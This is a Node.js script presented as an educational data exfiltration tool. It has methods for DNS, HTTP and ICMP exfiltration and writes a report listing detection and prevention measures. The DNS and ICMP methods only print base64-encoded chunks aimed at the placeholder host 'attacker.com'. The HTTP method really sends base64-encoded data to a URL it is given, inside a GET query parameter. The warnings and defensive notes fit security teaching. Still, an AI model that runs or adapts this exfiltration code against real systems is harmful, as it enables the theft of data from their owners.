#!/usr/bin/env node
/**
 * Data Exfiltration Tool
 * Demonstrates data exfiltration techniques (for educational purposes).
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class DataExfiltration {
    constructor() {
        this.data = [];
    }

    exfiltrateDns(data, domain = 'attacker.com') {
        console.log(`[*] Exfiltrating data via DNS to ${domain}...`);
        
        const encoded = Buffer.from(data).toString('base64');
        const chunks = [];
        
        for (let i = 0; i < encoded.length; i += 60) {
            chunks.push(encoded.substring(i, i + 60));
        }
        
        chunks.forEach((chunk, i) => {
            const subdomain = `${chunk}.${domain}`;
            console.log(`[*] DNS query: ${subdomain}`);
        });
        
        return chunks.length;
    }

    async exfiltrateHttp(data, url) {
        console.log(`[*] Exfiltrating data via HTTP to ${url}...`);
        
        const encoded = Buffer.from(data).toString('base64');
        
        try {
            const urlObj = new URL(url);
            urlObj.searchParams.set('data', encoded);
            
            const protocol = urlObj.protocol === 'https:' ? https : http;
            await new Promise((resolve, reject) => {
                protocol.get(urlObj.toString(), { timeout: 10000 }, (res) => {
                    resolve();
                }).on('error', reject);
            });
            
            console.log(`[*] HTTP GET: ${urlObj.toString().substring(0, 100)}...`);
            return true;
        } catch (err) {
            console.log(`[-] Error: ${err.message}`);
            return false;
        }
    }

    exfiltrateIcmp(data, target) {
        console.log(`[*] Exfiltrating data via ICMP to ${target}...`);
        
        const encoded = Buffer.from(data).toString('base64');
        console.log(`[*] ICMP packet with payload: ${encoded.substring(0, 50)}...`);
        
        return true;
    }

    generateReport() {
        let report = `# Data Exfiltration Techniques Report\n\n`;
        report += `## Techniques Demonstrated\n\n`;
        report += `1. **DNS Exfiltration**: Data encoded in DNS queries\n`;
        report += `2. **HTTP Exfiltration**: Data sent via HTTP requests\n`;
        report += `3. **ICMP Exfiltration**: Data embedded in ICMP packets\n\n`;
        
        report += `## Detection Methods\n\n`;
        report += `1. Monitor DNS queries for unusual patterns\n`;
        report += `2. Analyze HTTP traffic for data exfiltration\n`;
        report += `3. Monitor ICMP traffic volume\n`;
        report += `4. Use DLP (Data Loss Prevention) solutions\n\n`;
        
        report += `## Prevention\n\n`;
        report += `1. Implement network monitoring\n`;
        report += `2. Use egress filtering\n`;
        report += `3. Encrypt sensitive data at rest\n`;
        report += `4. Implement data classification\n`;
        report += `5. Monitor for unusual network activity\n\n`;
        
        report += `⚠️ **WARNING**: This tool is for educational purposes only!\n`;
        report += `⚠️ Only use for authorized security testing!\n\n`;
        
        return report;
    }
}

function main() {
    console.log('Data Exfiltration Tool');
    console.log('='.repeat(50));
    console.log('⚠️ WARNING: This tool is for authorized security testing only!');
    console.log('⚠️ Only use on systems you own or have permission to test!\n');
    
    const exfil = new DataExfiltration();
    const report = exfil.generateReport();
    
    const filename = 'data_exfiltration_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] Data exfiltration tool structure created`);
    console.log(`[+] Report saved to ${filename}`);
}

if (require.main === module) {
    main();
}

module.exports = DataExfiltration;

